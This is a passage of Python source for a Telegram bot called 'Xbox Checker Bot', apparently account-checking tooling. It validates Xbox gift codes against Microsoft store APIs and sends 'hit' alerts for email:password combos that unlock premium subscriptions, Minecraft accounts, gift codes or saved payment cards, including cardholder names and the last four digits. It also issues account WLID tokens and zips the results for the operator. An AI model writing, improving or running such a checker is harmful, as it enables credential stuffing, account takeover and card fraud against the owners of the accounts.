        url = f"https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/{code}?market=US&language=en-US&supportMultiAvailabilities=true"
        result['url'] = url
        
        try:
            async with aiohttp.ClientSession() as session:
                # First API call
                async with session.get(url, headers=headers, timeout=30) as resp:
                    result['headers'] = dict(resp.headers)
                    result['status_code'] = resp.status
                    
                    if resp.status == 200:
                        data = await resp.json()
                        result['raw_response'] = data
                        
                        # Extract basic info
                        result['token_state'] = data.get("tokenState", "Unknown")
                        result['store_ids'] = data.get("universalStoreBigIds", [])
                        
                        # Set status based on tokenState
                        state = data.get("tokenState", "")
                        if state == "Active":
                            result['status'] = 'valid'
                        elif state == "Redeemed":
                            result['status'] = 'used'
                        elif state == "Expired":
                            result['status'] = 'expired'
                        elif data.get("code") == "Unauthorized":
                            result['status'] = 'error'
                            result['error'] = "WLID unauthorized"
                        
                        # Try to get product title from products array
                        if data.get("products") and len(data["products"]) > 0:
                            product = data["products"][0]
                            title = product.get("sku", {}).get("title") or product.get("title")
                            if title:
                                result['title'] = title
                        
                        # Try to get title from universalStoreBigIds
                        elif result['store_ids']:
                            for store_id in result['store_ids']:
                                parts = store_id.split("/")
                                if len(parts) >= 2:
                                    product_id = parts[0]
                                    sku_id = parts[1]
                                    
                                    # Fetch product details
                                    catalog_url = f"https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds={product_id}&market=US&languages=en-US"
                                    async with session.get(catalog_url) as prod_resp:
                                        if prod_resp.status == 200:
                                            prod_data = await prod_resp.json()
                                            if prod_data.get("Products"):
                                                product = prod_data["Products"][0]
                                                if product.get("LocalizedProperties"):
                                                    title = product["LocalizedProperties"][0].get("ProductTitle")
                                                    if title:
                                                        result['title'] = title
                                                        break
                    
                    elif resp.status == 401:
                        result['status'] = 'error'
                        result['error'] = "Unauthorized - Invalid WLID token"
                    elif resp.status == 403:
                        result['status'] = 'error'
                        result['error'] = "Forbidden - Token lacks permissions"
                    elif resp.status == 404:
                        result['status'] = 'invalid'
                        result['error'] = "Code not found or invalid"
                    elif resp.status == 429:
                        result['status'] = 'error'
                        result['error'] = "Rate limited - Too many requests"
                    else:
                        result['status'] = 'error'
                        result['error'] = f"HTTP Error {resp.status}"
                        
        except asyncio.TimeoutError:
            result['status'] = 'error'
            result['error'] = "Request timeout"
        except aiohttp.ClientError as e:
            result['status'] = 'error'
            result['error'] = f"Connection error: {str(e)}"
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def format_detailed_code_result(self, result: dict) -> str:
        """Format code check result with detailed API response"""
        code = result.get('code', 'Unknown')
        status = result.get('status', 'unknown')
        title = result.get('title', 'Unknown')
        token_state = result.get('token_state', 'Unknown')
        store_ids = result.get('store_ids', [])
        raw_response = result.get('raw_response', {})
        status_code = result.get('status_code')
        error = result.get('error')
        url = result.get('url', '')
        
        # Color status
        if status == 'valid':
            status_emoji = '✅'
            status_text = 'VALID'
        elif status == 'used':
            status_emoji = '🔄'
            status_text = 'USED'
        elif status == 'expired':
            status_emoji = '⏰'
            status_text = 'EXPIRED'
        elif status == 'error':
            status_emoji = '❌'
            status_text = 'ERROR'
        else:
            status_emoji = '❓'
            status_text = 'UNKNOWN'
        
        # Build the output
        output = []
        
        
        # Create a box border
        output.append("╔════════════════════════════════╗")
        output.append("║           XBOX CODE CHECKER            ║")
        output.append("╚════════════════════════════════╝")
        output.append("")
        
        # Basic info
        output.append(f"**Code:** `{code}`")
        if title and title != 'Unknown':
            output.append(f"**Product:** {title}")
        output.append(f"**Status:** {status_emoji} **{status_text}**")
        if token_state and token_state != 'Unknown':
            output.append(f"**Token State:** `{token_state}`")
        if status_code:
            output.append(f"**HTTP Status:** `{status_code}`")
        if error:
            output.append(f"**Error:** `{error}`")
        output.append("")
        
                
        # Store IDs
        if store_ids:
            output.append("**Store IDs:**")
            for store_id in store_ids:
                output.append(f"  `{store_id}`")
            output.append("")
        
        # Headers (if available and not too many)
        headers = result.get('headers', {})
        if headers and len(str(headers)) < 1000:
            output.append("**Response Headers:**")
            header_str = json.dumps(dict(headers), indent=2)
            output.append(f"```json\n{header_str}\n```")
            output.append("")
        
        # Add separator
        output.append("══════════════════════════════════")
        
        return "\n".join(output)
    
    async def send_hit_notification(self, user_id: int, result: dict):
        """Send real-time hit notification"""
        try:
            status = result['status']
            email = result['email']
            password = result['password']
            combo = f"{email}:{password}"
            
            if status == 'PREMIUM':
                subs = result['subscriptions']
                sub_list = "\n".join([f"• {s['title']} ({s['days']} days)" for s in subs[:3]])
                text = (
                    f"**💎 PREMIUM HIT!**\n\n"
                    f"**Combo:** `{combo}`\n"
                    f"**Subscriptions:**\n{sub_list}\n"
                )
                if len(subs) > 3:
                    text += f"...and {len(subs)-3} more\n"
                if result['payment'] and result['payment'].get('holder'):
                    p = result['payment']
                    text += f"**Card:** {p['card_type']} ****{p['last4']}\n"
                if result['rewards'] > 0:
                    text += f"**Rewards:** {result['rewards']} pts\n"
                await self.app.send_message(user_id, text)
            
            elif status == 'MINECRAFT':
                mc = result['minecraft']
                text = (
                    f"**⛏️ MINECRAFT HIT!**\n\n"
                    f"**Combo:** `{combo}`\n"
                    f"**Name:** {mc.get('name', 'N/A')}\n"
                )
                if mc.get('gp_type'):
                    text += f"**Game Pass:** {mc['gp_type']}\n"
                if mc.get('capes'):
                    text += f"**Capes:** {mc['capes']}\n"
                await self.app.send_message(user_id, text)
            
            elif status == 'CODES' or result['xbox_codes']:
                codes_text = format_codes_for_display(result['xbox_codes'], 15)
                if codes_text:
                    text = (
                        f"**🎮 CODES FOUND!**\n\n"
                        f"**Combo:** `{combo}`\n\n"
                        f"{codes_text}"
                    )
                    await self.app.send_message(user_id, text)
            
            elif result['payment'] and result['payment'].get('holder'):
                p = result['payment']
                text = (
                    f"**💳 CARD HIT!**\n\n"
                    f"**Combo:** `{combo}`\n"
                    f"**Card:** {p['card_type']} ****{p['last4']}\n"
                    f"**Holder:** {p['holder']}\n"
                    f"**Country:** {p.get('country', 'N/A')}\n"
                )
                await self.app.send_message(user_id, text)
            
        except Exception as e:
            print(f"{C.R}[Hit Notification Error] {e}{C.END}")
    
    async def send_wlid_notification(self, user_id: int, result: dict):
        """Send WLID token notification"""
        try:
            if result.get('success'):
                token = result['token']
                display = token
                text = (
                    f"**🔑 WLID TOKEN GENERATED!**\n\n"
                    f"**Account:** `{result['email']}`\n"
                    f"**Token:** `{display}`\n\n"
                    f"**📋 Click the token above to copy!**"
                )
                await self.app.send_message(user_id, text)
        except Exception as e:
            print(f"{C.R}[WLID Notification Error] {e}{C.END}")
    
    async def finish_task(self, user_id: int, status_message, task_type: str = "checker"):
        """Finish task and send results"""
        task = await self.task_manager.get_task(user_id)
        if not task:
            return
        
        # Create ZIP
        zip_path = self.results_handler.create_zip(user_id)
        
        if zip_path and zip_path.exists():
            # Send ZIP file
            await self.app.send_document(
                user_id,
                str(zip_path),
                caption=f"**✅ TASK COMPLETE!**\n\n{task.get_progress_text()}"
            )
            
            # Update status message
            try:
                await status_message.edit_text(
                    f"**✅ Task Completed!**\n\n"
                    f"{task.get_progress_text()}\n\n"
                    f"**📦 Results sent as ZIP!**"
                )
            except:
                pass
            
            # Clean up ZIP
            os.unlink(zip_path)
        else:
            try:
                await status_message.edit_text(
                    f"**✅ Task Completed!**\n\n"
                    f"{task.get_progress_text()}\n\n"
                    f"**❌ No results found!**"
                )
            except:
                pass
        
        # Clear user data
        self.results_handler.clear_user_data(user_id)
    
    async def finish_wlid_task(self, user_id: int, status_message, successful_tokens):
        """Finish WLID task and send results"""
        task = await self.task_manager.get_task(user_id)
        if not task:
            return
        
        if successful_tokens:
            # Format tokens for display
            text = format_wlids_for_display(successful_tokens, 20)
            
            try:
                await status_message.edit_text(text)
            except:
                pass
        
        # Create and send ZIP
        zip_path = self.results_handler.create_zip(user_id)
        
        if zip_path and zip_path.exists():
            await self.app.send_document(
                user_id,
                str(zip_path),
                caption=f"**✅ WLID GENERATION COMPLETE!**\n\n{task.get_progress_text()}"
            )
            os.unlink(zip_path)
        
        self.results_handler.clear_user_data(user_id)
    
    async def finish_codecheck_task(self, user_id: int, status_message, results):
        """Finish code check task and send results"""
        task = await self.task_manager.get_task(user_id)
        if not task:
            return
        
        # Create and send ZIP
        zip_path = self.results_handler.create_zip(user_id)
        
        if zip_path and zip_path.exists():
            await self.app.send_document(
                user_id,
                str(zip_path),
                caption=f"**✅ CODE CHECK COMPLETE!**\n\n{task.get_progress_text()}"
            )
            os.unlink(zip_path)
        
        self.results_handler.clear_user_data(user_id)
    
    async def start(self):
        """Start the bot"""
        print(f"{C.G}╔════════════════════════════════════════════╗{C.END}")
        print(f"{C.G}║    XBOX CHECKER BOT v8.0 - STARTING      ║{C.END}")
        print(f"{C.G}╠════════════════════════════════════════════╣{C.END}")
        print(f"{C.C}║  API ID: {API_ID}{C.END}")
        print(f"{C.C}║  Bot Token: {BOT_TOKEN[:10]}...{C.END}")
        print(f"{C.C}║  Threads: 50{C.END}")
        print(f"{C.C}║  Update Interval: {UPDATE_INTERVAL} seconds{C.END}")
        print(f"{C.C}║  New Features: WLID & Code Checker{C.END}")
        print(f"{C.C}║  Code Checker shows RAW API Response{C.END}")
        print(f"{C.G}╚════════════════════════════════════════════╝{C.END}")
        print(f"{C.G}[+] Bot is running! Press Ctrl+C to stop.{C.END}")
        
        await self.app.start()
        await asyncio.Event().wait()
    
    async def stop(self):
        """Stop the bot"""
        await self.app.stop()
        print(f"{C.Y}[!] Bot stopped.{C.END}")


# ============================================================================
# MAIN
# ============================================================================
async def main():
    bot = XboxCheckerBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Shutting down...{C.END}")
    finally:
        await bot.stop()


if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())
